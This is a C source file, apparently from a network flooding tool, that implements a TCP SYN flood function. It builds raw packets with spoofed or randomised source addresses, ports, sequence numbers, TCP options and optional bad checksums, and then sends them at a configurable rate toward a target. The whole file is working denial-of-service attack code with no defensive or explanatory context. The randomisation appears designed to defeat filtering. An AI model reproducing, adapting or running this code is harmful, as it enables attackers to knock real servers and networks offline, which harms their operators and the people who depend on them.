#include "../../include/methods.h"

typedef struct tcpopts {
	u_char	msskind;
	u_char	msslen;
	u_short	mssvalue;
	u_char	nop_nouse;
	u_char	wskind;
	u_char	wslen;
	u_char	wsshiftcount;
	u_char	nop_nouse2;
	u_char	nop_nouse3;
	u_char	sackkind;
	u_char	sacklen;
	u_char	nop;
	u_char	nop1;
	u_char	tsopt;
	u_char	tslen;
	u_int	tsval;
	u_int	tsecr;
} tcpopts_t;

static struct tcphdr		*tcp;
static tcpopts_t		*opts;
static struct iphdr		*ip;
static u_char			frame[65535];
static u_char			ctos[3]={0, 40, 72};
static u_short			windows[3]={29200, 64535, 65535};
static u_char			shiftcount[4]={0x00, 0x03, 0x06, 0x08};

static void inline for_iteration(method_args_t *a)
{
	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();

	opts->mssvalue=htons(randnum(1400, 1600));
	opts->tsval=htonl(randnum(100000, 999999));
	opts->wsshiftcount=shiftcount[randnum(0, 4)];
	ip->id=htons(random_u16());
	ip->tos=ctos[randnum(0, 2)];
	tcp->seq=htonl(random_u32());
	tcp->window=htons(windows[randnum(0, 2)]);

	tcp->dest=(a->o->OPT_DSTPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_DSTPORT);
	tcp->source=(a->o->OPT_SRCPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_SRCPORT);

	tcp->check=0;
	tcp->check=ip4_pseudocheck(ip->saddr, ip->daddr,
		IPPROTO_TCP, sizeof(struct tcphdr)+
		sizeof(tcpopts_t), tcp);

	if (a->o->OPT_BADSUM==ARANDVAL) {
		if (randnum(0,1)==0)
			--tcp->check;
	}
	else if (a->o->OPT_BADSUM==1)
		--tcp->check;

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));
}

void tcp_syn_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);
	tcp=(struct tcphdr*)(frame+14+(sizeof(struct iphdr)));
	opts=(tcpopts_t*)(frame+14+(sizeof(struct iphdr)+sizeof(struct tcphdr)));

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=htons(0x4000);
	ip->protocol=IPPROTO_TCP;
	ip->saddr=a->source;
	ip->daddr=a->target;
	ip->tot_len=htons((sizeof(struct iphdr)+
		sizeof(struct tcphdr)+sizeof(tcpopts_t)));
	tcp->syn=1;
	tcp->doff=((sizeof(struct tcphdr))+sizeof(tcpopts_t))/4;
	opts->msskind=0x02;
	opts->msslen=0x04;
	opts->nop_nouse=0x01;
	opts->wskind=0x03;
	opts->wslen=0x03;
	opts->nop_nouse2=0x01;
	opts->nop_nouse3=0x01;
	opts->sackkind=0x04;
	opts->sacklen=0x02;
	opts->tsopt=0x08;
	opts->tslen=0x0A;
	opts->tsecr=0;
	opts->nop=1;
	opts->nop1=1;

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
}
